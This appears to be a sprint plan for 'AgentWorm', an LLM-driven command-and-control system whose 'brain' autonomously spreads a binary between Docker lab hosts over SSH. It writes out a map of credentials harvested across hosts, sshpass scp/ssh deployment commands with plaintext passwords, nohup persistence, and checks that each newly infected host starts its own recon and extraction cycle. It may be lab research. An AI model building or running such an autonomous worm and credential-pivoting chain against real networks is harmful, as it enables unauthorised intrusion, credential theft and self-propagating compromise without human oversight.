# Sprint 4: Lateral Movement via SSH (M-05, M-06 partial)

**Status:** In Progress
**Depends on:** Sprint 3 complete and verified
**Goal:** After recon + extraction complete, the C2 brain autonomously deploys the DBA binary onto a newly discovered host via SSH using cross-host credentials. The new host registers with C2 and starts its own kill chain cycle.

---

## Milestones Unlocked

| Milestone | Description |
|---|---|
| M-05 | DBA successfully deployed on first lateral target |
| M-06 (partial) | Cross-host credential correlation attempted — brain uses host B's creds to pivot from host A |

---

## Requirements Checked

| ID | Requirement | Verification |
|---|---|---|
| FR-KC-03 | C2 autonomously selects target and issues scp + ssh to deploy DBA | `BRAIN QUEUED` shows sshpass command; new `REGISTERED` appears |
| FR-C2-03 (partial) | Credentials from Host A tested against hosts discovered via Host A | LLM prompt includes `known_credentials_by_ip` with all hosts' creds |
| FR-DBA-03 | DBA on lateral target runs as persistent background process | `nohup ... &` in ssh command; process survives session close |
| M-05 | DBA deployed on first lateral target | 4th `REGISTERED` log event from a host not in docker-compose |
| M-06 (partial) | Cross-host credential correlation attempted | sshpass on host01 uses bob's password from C2's knowledge of host02 |

---

## Files Produced / Modified

```
AgentWorm/
├── dba/
│   ├── Dockerfile             # MODIFIED: openssh-server + sshpass added
│   └── entrypoint.sh          # MODIFIED: creates Linux user, starts sshd
├── c2/
│   ├── skills/
│   │   └── lateral.md         # NEW: lateral movement skill prompt
│   ├── brain.py               # MODIFIED: lateral skill loaded, on_result extended
│   └── main.py                # MODIFIED: _infected_ips() + _known_creds_by_ip() helpers
```

---

## How Cross-Host Credential Correlation Works

`main.py` builds `known_credentials_by_ip` from ALL registered hosts before each LLM call:
```json
{
  "172.20.0.11": {"username": "alice", "credentials": [{"key": "SSH_PASS", "value": "alice-secret-01"}]},
  "172.20.0.12": {"username": "bob",   "credentials": [{"key": "SSH_PASS", "value": "bob-secret-02"}]},
  "172.20.0.13": {"username": "carol", "credentials": [{"key": "API_KEY",  "value": "carol-secret-03"}]}
}
```
When host01 (alice) is reasoning about lateral movement, the brain supplies this full map.
The LLM sees `.12` in host01's `discovered_hosts` AND in `known_credentials_by_ip`, picks `bob-secret-02`, and constructs a valid sshpass command targeting `.12`.

---

## Verification Checklist

```bash
# 1. Rebuild
docker compose down && docker compose up --build

# 2. Verify sshd running and Linux users created on each host
docker exec agentworm-host01 service ssh status
docker exec agentworm-host01 id alice
docker exec agentworm-host02 id bob
docker exec agentworm-host03 id carol

# 3. Manually verify SSH works container-to-container
docker exec agentworm-host01 \
  sshpass -p 'bob-secret-02' ssh -o StrictHostKeyChecking=no bob@172.20.0.12 'hostname'
# Expected: fileserver-02

# 4. Watch for lateral movement command (no manual /queue)
docker logs -f agentworm-c2 | grep -E "BRAIN QUEUED|sshpass|REGISTERED"
# Expected after extraction:
#   BRAIN QUEUED host_id=XXXX cmd='sshpass -p bob-secret-02 scp ...'
# Then within one beacon cycle:
#   REGISTERED host_id=YYYY hostname=fileserver-02 ip=172.20.0.12 ...

# 5. Confirm host_count grew to 4+ (M-05)
curl -s http://localhost:8000/health | python3 -m json.tool
# Expected: "host_count": 4

# 6. Confirm new host runs its own recon cycle automatically
docker logs agentworm-c2 | grep -A20 "REGISTERED host_id=YYYY"
# Expected: BRAIN QUEUED recon commands for YYYY without any manual intervention
```

**Pass criteria:**
- sshd running and Linux user exists on all containers
- Manual SSH between containers succeeds (step 3)
- `sshpass scp && ssh` command appears in C2 logs autonomously after extraction
- A 4th `REGISTERED` event appears for a host that was not in docker-compose
- `/health` shows `host_count` ≥ 4
- New host autonomously starts its own recon + extraction cycle
